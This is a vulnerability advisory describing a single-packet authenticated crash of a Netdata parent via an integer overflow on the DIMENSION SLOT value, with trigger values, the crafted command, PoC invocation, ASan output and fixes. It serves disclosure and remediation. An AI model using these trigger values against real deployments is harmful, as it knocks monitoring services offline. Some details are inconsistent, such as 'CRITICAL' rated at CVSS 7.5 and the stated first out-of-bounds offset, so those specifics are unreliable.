# Advisory: Remote DoS via DIMENSION SLOT Integer Overflow

**CVE**: Requesting  
**Severity**: **CRITICAL** (CVSS 3.1: 7.5 — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)  
**Affected**: Netdata Agent v2.10.0-289-nightly (commit 4b4599484) and all earlier versions containing `pluginsd_rrddim_put_to_slot()` without slot upper-bound check.  
**Credit**: danil  
**Status**: Unfixed — commit f7c880435 adds only PoC artifacts, no source fix.

---

## Summary

A malicious or compromised streaming child agent can send a crafted `DIMENSION SLOT:<value>` command with a 64-bit slot value that causes an **integer overflow** in `prd_array_create()`. The allocation `sizeof(PRD_ARRAY) + slot × sizeof(struct pluginsd_rrddim)` wraps around `size_t`, producing a tiny buffer (16–48 bytes) while `arr->size` is set to the original huge slot value. The initialization loop then writes 24 bytes per iteration up to `arr->size`, immediately overflowing the undersized allocation → **SIGSEGV / heap corruption**.

This is a **single-packet authenticated remote crash** of the parent Netdata process.

**Example trigger values** (both produce the same overflow crash):
| Slot Value | Requested | Actual Alloc | `arr->size` |
|---|---|---|---|
| `0x0AAAAAAAAAAAAAAB` | 24 bytes | 24 bytes from `calloc` | 768,614,336,404,564,651 |
| `0x2000000000000000` | 16 bytes | 16 bytes from `calloc` | 2,305,843,009,213,693,952 |

## Attack Flow

```
Step    What happens
━━━━━━  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1      A streaming peer with valid credentials sends a DIMENSION SLOT:<very-large-value> command.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  2      The parent parses the slot via str2ull_encoded() — full 64-bit, no upper bound — and uses it
         as the requested PRD dimension-cache size.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  3      prd_array_create(slot) evaluates:
           sizeof(PRD_ARRAY) + slot × sizeof(struct pluginsd_rrddim)
           = 16 + slot × 24
         The multiplication overflows size_t, producing a tiny value (e.g. 24 bytes).
         callocz(1, 24) succeeds, returning a 24-byte buffer.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  4      arr->size = slot  — the original huge value (e.g. 7.6×10¹⁷) — is stored as the logical size.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  5      The grow path runs the init loop:
           for(i = 0; i < arr->size; i++)
             entries[i] = {NULL, NULL, NULL}
         The first iteration writes entries[0].rda at offset +16 from the allocation —
         already past the 24-byte buffer.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  6      The OOB write corrupts adjacent heap memory (adjacent objects, glibc chunk headers).
         In production this causes SIGSEGV when the loop hits unmapped memory.
         Under ASan the heap-buffer-overflow is caught on the first OOB byte.
──────  ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  7      Code execution **never reaches** the controlled-write path at entries[slot-1] that follows
         the init loop. The init loop crashes first — the parent terminates on this single packet.
         The corrupted heap is never dereferenced by subsequent logic.
```

- **Protocol**: Netdata streaming (TCP/19999)
- **Authentication required**: Valid streaming API key UUID (shared among children in a key group)
- **Access control**: Default `allow from = *`
- **Preconditions**: Parent has `[API_KEY]` with `enabled = yes` (standard parent-child deployment)

A compromised child or an insider with streaming credentials can kill the parent process with one packet.

## Root Cause

Three locations, each missing an upper-bound check:

### 1. Slot Parsing — No Upper Bound

`src/plugins.d/pluginsd_internals.h:372-382`

```c
static ALWAYS_INLINE ssize_t pluginsd_parse_rrd_slot(char **words, size_t num_words) {
    ssize_t slot = -1;
    char *id = get_word(words, num_words, 1);
    if(id && id[0] == 'S' && id[1] == 'L' && id[2] == 'O' && id[3] == 'T' && id[4] == ':') {
        slot = (ssize_t) str2ull_encoded(&id[5]);  // Full 64-bit, no upper bound
        if(slot < 0) slot = 0;  // Only clamps negatives
    }
    return slot;
}
```

`str2ull_encoded()` parses the full 64-bit range. The function **only clamps negative values** (the `(ssize_t)` cast makes values ≥ 2^63 appear negative). Values above the legitimate slot range pass through.

### 2. Allocation — Integer Overflow

`src/database/rrdset-pluginsd-array.h:51-57`

```c
static inline PRD_ARRAY *prd_array_create(size_t size) {
    PRD_ARRAY *arr = callocz(1, sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
    //                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //                              sizeof(PRD_ARRAY)=16  sizeof(rrddim)=24
    //                              16 + size*24  OVERFLOWS size_t when size >= 0xAAAAAAAAAAAAAAA
    arr->size = size;   // Huge logical size stored
    return arr;
}
```

For `size = 0xAAAAAAAAAAAAAAB`:
- `16 + 0xAAAAAAAAAAAAAAB × 24` wraps to **24 bytes** via unsigned overflow
- `callocz(1, 24)` succeeds, returning a tiny 24-byte buffer
- `arr->size` is set to **768,614,336,404,564,651** (the original huge value)

### 3. Initialization Loop — OOB Heap Write

`src/plugins.d/pluginsd_internals.h:202-206`

```c
for(size_t i = current_size; i < wanted_size; i++) {
    new_arr->entries[i].rda = NULL;   // Writes past 24-byte buffer immediately
    new_arr->entries[i].rd  = NULL;
    new_arr->entries[i].id  = NULL;
}
```

The loop iterates up to `arr->size` (the huge logical value), writing 24 bytes per iteration past the tiny allocation. The first write at `entries[0].rda` lands at offset +16 from the allocation — already past the 24-byte buffer.

### Contrast: Chart Slot Is Protected

The chart-slot equivalent (`pluginsd_rrdset_cache_put_to_slot` at line 384) correctly guards:

```c
if(unlikely(slot < 1 || slot >= INT32_MAX))
    return;
```

The dimension-slot path has no such check.

## Proof of Concept

### Lab Setup

```
# On VPS / lab parent:
$ git clone https://github.com/netdata/netdata.git
$ cd netdata
$ git checkout 4b4599484
$ cmake -S . -B build -DCMAKE_C_FLAGS="-fsanitize=address -g -O0"
$ cmake --build build -j$(nproc)
$ cat > /tmp/stream.conf << 'EOF'
[stream]
    enabled = yes
[API_KEY]
    type = api
    enabled = yes
EOF
$ sudo ./build/bin/netdata -D -i 127.0.0.1 -p 19999
```

### Crash Trigger (Heap Overflow — Instant SIGSEGV)

```
$ python3 security-audit/poc_stream_dimension_slot.py \
    127.0.0.1 19999 \
    '<API_KEY>' \
    0x0AAAAAAAAAAAAAAB
```

Parent ASan output (excerpt):
```
=================================================================
==PID==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8 at 0x503000000058 thread T0
    #0 in put_to_slot .../pluginsd_internals.h:203
    #1 in pluginsd_dimension .../pluginsd_parser.c:572

0x503000000058 is located 0 bytes after 24-byte region
allocated by thread T0 here:
    #0 in calloc
    #1 in prd_array_create .../rrdset-pluginsd-array.h:52
    #2 in pluginsd_rrddim_put_to_slot .../pluginsd_internals.h:180
```

### Network-Level PoC

`poc_stream_dimension_slot.py` connects to the parent's streaming port, completes the streaming handshake with a valid API key, sends `CHART` to establish a chart scope, then sends `DIMENSION SLOT:<overflow_value> d1 'd1' absolute 1 1 ''`.

The full script is included in this advisory's companion file (`poc_stream_dimension_slot.py`).

## Impact

- **Single-packet remote crash** of the Netdata parent process
- **Guaranteed** via either SIGSEGV (overflow slot) or `fatal()` exit (large valid slot)
- Affects every parent-child deployment where children have valid streaming credentials (the standard threat model)
- No fix available as of the latest nightly (v2.10.0-289)

## Remediation

### Immediate Fix

Add an upper-bound check in `pluginsd_rrddim_put_to_slot()`, mirroring the chart-slot guard:

```c
// In pluginsd_rrddim_put_to_slot(), after computing wanted_size:
if(slot >= 1) {
    if(unlikely((size_t)slot > PLUGINSD_MAX_DIM_SLOTS)) {  // e.g., 1000000
        netdata_log_error("PLUGINSD: dimension slot %zd exceeds maximum", slot);
        return;
    }
    wanted_size = (size_t)slot;
}
```

### Defense in Depth

Add an overflow check in `prd_array_create()`:

```c
static inline PRD_ARRAY *prd_array_create(size_t size) {
    size_t alloc_size;
    if(__builtin_mul_overflow(size, sizeof(struct pluginsd_rrddim), &alloc_size) ||
       __builtin_add_overflow(alloc_size, sizeof(PRD_ARRAY), &alloc_size)) {
        netdata_log_error("PRD_ARRAY: allocation size overflow (size=%zu)", size);
        return NULL;
    }
    PRD_ARRAY *arr = callocz(1, alloc_size);
    ...
}
```

### Consistency Audit

Audit all `pluginsd_parse_rrd_slot()` consumers to ensure they bound the slot before using it as an allocation size or array index.

## Timeline

| Date | Event |
|---|---|
| 2026-05-29 | Vulnerability discovered and PoCs developed |
| 2026-05-29 | Advisory drafted; no vendor contact yet |
